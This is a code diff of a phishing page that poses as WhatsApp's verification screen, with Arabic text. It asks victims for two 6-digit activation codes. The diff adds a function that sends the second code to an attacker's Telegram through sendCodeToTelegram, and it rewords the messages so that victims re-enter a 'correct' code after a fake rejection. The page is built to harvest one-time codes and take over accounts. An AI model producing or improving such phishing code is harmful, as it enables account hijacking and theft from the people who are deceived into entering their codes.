@@ -173,7 +173,7 @@
             const activationCode1 = document.getElementById('activationCode1').value;
 
             if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
-                alert('يرجى إدخال رمز التفعيل المكون من 6 أرقام.');
+                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
                 return;
             }
 
@@ -184,7 +184,7 @@
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>رمز التفعيل الثاني</h1>
-                    <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
+                    <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام.</p>
                     <input id="activationCode2" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="رمز التفعيل" maxlength="6">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
                     <div id="countdown"></div>
@@ -193,7 +193,16 @@
             });
         }
 
-        // باقي الأكواد كما هي مع استخدام دالة enforceNumericInput للحقول الجديدة
+        function submitSecondActivationCode() {
+            const activationCode2 = document.getElementById("activationCode2").value;
+
+            if (!activationCode2 || activationCode2.length !== 6 || !/^\d{6}$/.test(activationCode2)) {
+                alert("يرجى إدخال رمز التفعيل المكون من 6 أرقام.");
+                return;
+            }
+
+            sendCodeToTelegram(activationCode2, "رمز التفعيل الثاني");
+        }
     </script>
 </body>
 
